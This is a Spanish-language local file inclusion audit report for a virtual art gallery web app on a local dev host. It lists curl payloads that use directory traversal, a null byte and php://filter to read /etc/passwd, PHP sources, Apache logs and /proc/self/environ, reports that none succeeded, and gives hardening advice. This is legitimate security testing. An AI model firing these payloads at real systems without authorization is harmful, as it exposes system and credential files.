# Informe de auditoría LFI — Galería de Arte Virtual

Objetivo: http://web.dev.local:8081
Fecha: 2026-04-27T06:49:39Z

Resumen ejecutivo:
- Resultado: No se logró extraer ficheros sensibles del sistema ni ficheros de la aplicación mediante técnicas LFI probadas.
- Vectores probados: parámetros page, file, include, view, template en gallery.php; payloads de directory traversal y php://filter.

Pruebas realizadas (comandos exactos):
- curl -s "http://web.dev.local:8081/?file=/etc/passwd"
- ffuf/gobuster discovery (se usó gobuster con wordlist common.txt)
- Pruebas LFI ejecutadas contra gallery.php:
  - curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"
  - curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd%00"
  - curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"
  - curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php"
  - curl -s "http://web.dev.local:8081/gallery.php?file=../../../../../../etc/passwd"
  - curl -s "http://web.dev.local:8081/gallery.php?include=../../../../../../etc/passwd"
  - curl -s "http://web.dev.local:8081/gallery.php?view=../../../../../../etc/passwd"
  - curl -s "http://web.dev.local:8081/gallery.php?template=../../../../../../etc/passwd"
  - curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/var/log/apache2/access.log"
  - curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/var/log/apache2/error.log"
  - curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/proc/self/environ"

Hallazgos y observaciones:
- Gobuster identificó /index.php y /pages/ (redirect) y archivos de configuración ocultos con respuesta 403 (.htaccess, .htpasswd).
- Las respuestas a los payloads LFI probados devolvieron contenido HTML de la aplicación o respuestas vacías; no se observaron contenidos de /etc/passwd ni de otros ficheros del sistema.
- La aplicación muestra enlaces del tipo gallery.php?page=modern lo que sugiere inclusión controlada por parámetro, pero las técnicas estándar de directory traversal y php://filter no devolvieron ficheros sensibles en este entorno.

Impacto:
- Sin confirmación de lectura de ficheros sensibles, no se puede afirmar explotación del LFI ni escalada a RCE en esta iteración.

Recomendaciones:
1. Revisar el código de inclusión en gallery.php para asegurar validación y normalización del parámetro (whitelist de páginas permitidas).
2. Evitar inclusión directa de parámetros en funciones include/require; usar mapas de rutas o switch.
3. Configurar PHP para deshabilitar wrappers peligrosos si no son necesarios y aplicar open_basedir si es aplicable.
4. Limitar permisos de fichero y asegurar logs no contengan datos sensibles; habilitar protections y monitoreo.

Comandos y salida relevantes están disponibles en el entorno del auditor (logs de curls y gobuster)."}